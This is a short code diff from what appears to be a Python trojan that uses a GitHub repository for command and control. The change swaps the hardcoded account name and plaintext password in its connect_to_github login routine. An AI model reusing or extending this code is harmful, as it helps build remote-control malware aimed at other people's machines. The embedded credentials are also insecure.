@@ -20,13 +20,13 @@ trojan_modules= []
 public_key = None
 task_queue = Queue.Queue()
 configured = False
-owner = "bsk2017pp"
+owner = "bskpp"
 repo_name = "trproject"
 
 #Connects to a GitHub account
 #Returns: github account, repository and branch steer objects
 def connect_to_github():
-    gh = login(owner, "bskppbskpp1")
+    gh = login(owner, "testpass2")
     repo = gh.repository(owner, repo_name)
     branch = repo.branch("master")
 
